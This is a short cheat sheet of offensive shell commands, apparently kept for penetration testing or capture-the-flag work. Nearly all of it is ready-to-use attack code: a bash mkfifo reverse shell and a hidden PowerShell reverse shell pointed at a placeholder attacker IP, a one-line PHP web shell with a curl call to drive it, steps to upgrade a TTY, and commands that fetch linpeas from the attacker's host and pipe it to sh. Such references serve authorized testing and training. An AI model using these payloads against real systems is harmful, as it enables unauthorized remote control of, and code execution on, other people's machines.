# Shell stuff

## Reverse Shell ([Online App](https://www.revshells.com))
- netcat
```
nc -lvnp 1234
```
Payloads:
- Bash (Linux)
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {MY IP} {PORT} >/tmp/f
```
- PowerShell (Windows)
```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{MY IP}",{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Web Shell 
- web browser/curl
```
curl http://{YOURWEBSITE}/payload.php?cmd={COMMANDS}
```
Payloads:
```
<?php system($_REQUEST["cmd"]); ?>
```

## Getting interactive shell
- In netcat
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
> press `Ctrl +Z`
```
stty raw -echo
fg
```
> press `Enter`

## Uploading files to target
- On your machine
```
python -m http.server 8000
```
- Download to target
```
wget YOUR_IP:8000/linpeas.sh -O linpeas.sh
```
- Download and execute
```
curl -L YOUR_IP:8000/linpeas.sh | sh
```

